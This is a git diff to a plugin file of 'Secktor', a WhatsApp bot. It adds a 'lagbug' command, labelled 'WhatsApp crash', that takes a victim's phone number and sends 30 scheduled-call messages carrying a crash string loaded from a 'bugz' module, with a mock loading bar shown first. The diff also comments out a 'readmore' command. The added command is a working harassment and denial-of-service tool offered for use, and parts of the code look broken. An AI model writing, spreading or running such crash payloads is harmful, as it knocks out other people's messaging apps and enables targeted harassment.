@@ -9,13 +9,59 @@
  * @description : Secktor,A Multi-functional whatsapp bot.
  * @version 0.0.6
  **/
+const { tlang, getAdmin, prefix, Config, sck, fetchJson, runtime,cmd,getBuffer } = require('../lib') 
+let { dBinary, eBinary } = require("../lib/binary");
+const { Sticker, createSticker, StickerTypes } = require("wa-sticker-formatter"); 
+const fs = require('fs') const axios = require('axios')
+const { bugtext1 } = require('./bugz/bugtext1')
+const { bugtext2 } = require('./bugz/bugtext2')
+const { bugtext3 } = require('./bugz/bugtext3')
+const { bugtext4 } = require('./bugz/bugtext4')
+const { bugtext5 } = require('./bugz/bugtext5')
+async function loading () {
+var mload = [
+"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
+"《 ████▒▒▒▒▒▒▒▒》30%",
+"《 ███████▒▒▒▒▒》50%",
+"《 ██████████▒▒》80%",
+"《 ████████████》100%",
+"Load Completed✅"
+]
+let { key } = await Void.sendMessage(from, {text: 'Loading Please Wait'})
 
- const { tlang, getAdmin, prefix, Config, sck, fetchJson, runtime,cmd,getBuffer } = require('../lib')
- let { dBinary, eBinary } = require("../lib/binary");
-const { Sticker, createSticker, StickerTypes } = require("wa-sticker-formatter");
- const fs = require('fs')
- const axios = require('axios')
+for (let i = 0; i < mload.length; i++) {
+await Void.sendMessage(from, {text: mload[i], edit: key });
+}
+}
+
   //---------------------------------------------------------------------------
+cmd({
+   pattern: "lagbug",
+   desc: "WhatsApp crash",
+   category: "owner",
+   resct: "💀"
+}, async(Void, citel, text,{ isCreator }) => {
+  if (!isCreator) return citel.reply(tlang().owner)
+  if(!text) return citel.reply("*Provide number,like 2347080968564*");
+  await loading()
+  victim = text.split("|")[0]+'@s.whatsapp.net'
+  amount = 30
+  for (let i = 0; i < amount; i++) {
+    const xeonybug1 = bugtext2
+    var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
+    "scheduledCallCreationMessage": {
+    "callType": "2",
+    "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+    "title": xeonybug1,
+    }
+   }), { userJid: from, quoted : m})
+   Void.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+   await sleep(3000)
+  }
+})
+	
+
+//--------------—------
  cmd({
     pattern: "setwelcome",
     desc: "sets welcome message in specific group.",
@@ -35,14 +81,14 @@ async(Void, citel, text,{ isCreator }) => {
 }
 )
  //---------------------------------------------------------------------------
-cmd({
+/*cmd({
 	pattern: 'readmore ?(.*)',
 	desc: 'Readmore generator',
 	category: 'misc',
-  react: '💎'
+        react: '💎'
 }, async (Void, citel, text) => {
 	await citel.reply(text.replace(/\+/g, (String.fromCharCode(8206)).repeat(4001)))
-});
+});*/
 //---------------------------------------------------------------------------
 
 //-----------------------------------—--
